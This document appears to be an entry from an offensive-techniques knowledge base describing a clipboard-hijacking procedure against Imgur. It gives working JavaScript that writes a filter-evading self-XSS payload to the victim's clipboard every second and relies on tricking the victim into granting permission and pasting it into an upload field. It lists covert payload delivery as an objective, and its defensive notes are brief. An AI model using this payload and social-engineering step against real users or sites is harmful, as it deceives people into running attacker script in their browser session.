---
id: proc-imgur-clipboard-copy
tags:
  - clipboard-api
  - payload-delivery
  - permission-trick
type: procedure
tools:
  - '[[tools/navigator-clipboard-api]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/setinterval-write-clipboard-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:13.045Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Copy Malicious Payload to Clipboard

## Summary

This procedure repeatedly writes a crafted self-XSS payload to the victim's clipboard using the navigator.clipboard API, requiring the victim to grant permission, preparing for paste into the upload field.

## Description

The payload '<<!<script>iframe src=javajavascriptscript:alert(document.domain)>' is written every second. This tricks the victim into copying 'red text' (the payload) after dragging. Firefox prompts for permission, which must be allowed. Expected outcome: Clipboard holds executable payload.

## Requirements

1. UI prompt from drag step active
2. HTTPS context for clipboard API
3. Victim grants permission

## Defense

Defensive measures and detection strategies:

- Browser policies to block clipboard writes without interaction
- Warn on permission prompts from embeds
- Monitor for repeated clipboard API calls
- CSP to restrict API usage

## Objectives

1. Deliver XSS payload covertly
2. Obtain necessary permissions
3. Set up for self-XSS trigger

## Instructions

### Step 1: Initiate Clipboard Writing Interval

**Context**: Write payload persistently until paste.

**Command** ([[commands/setinterval-write-clipboard-payload]]):
```javascript
setInterval(function() {
  navigator.clipboard.writeText('<<!<script>iframe src=javajavascriptscript:alert(document.domain)>').then(function(text) {
    console.log(text);
  });
}, 1000);
```

> Writes and logs payload. Expected output: Console shows payload; permission prompt appears.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- [[commands/setinterval-write-clipboard-payload]]

## Tools Used

- [[tools/navigator-clipboard-api]]

## Tags

- clipboard-manipulation
- self-xss-payload
